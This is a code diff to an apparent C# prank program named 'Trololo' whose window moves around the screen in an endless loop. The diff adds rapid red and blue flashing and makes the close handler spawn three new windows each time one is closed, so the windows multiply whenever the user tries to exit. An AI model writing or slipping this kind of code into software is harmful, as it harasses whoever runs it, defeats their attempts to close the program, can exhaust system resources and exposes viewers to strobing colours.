@@ -30,17 +30,34 @@ namespace Trololo
             Random rd = new Random();
             while (true)
             {
+                this.BackColor = Color.Red;
                 int picXPoint = rd.Next(0, bounds.Right - this.Width);
                 int picYPoint = rd.Next(0, bounds.Height - this.Height);
                 Point ulCorner = new Point(picXPoint, picYPoint);
                 this.Location = ulCorner;
-                Delay(55);
+                Delay((int)(128*2.256));
+                this.BackColor = Color.Blue;
+                Delay((int)(128*1.43333));
+                var tmpv = new Random().Next(5);
+                if (tmpv == 3)
+                {
+                    this.BackColor = Color.Red;
+                    label1.BackColor = Color.Blue;
+                    Delay((int)(128 * 1.43333));
+                    label1.BackColor = Color.Red;
+                    this.BackColor = Color.Blue;
+                    Delay((int)(128 * 1.43333));
+                    label1.BackColor = Color.Empty;
+                }
             }
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            new Form1().Show();
+            for (int i = 0; i < 3; i++)
+            {
+                new Form1().Show();
+            }
         }
 
         public static void Delay(int mm)
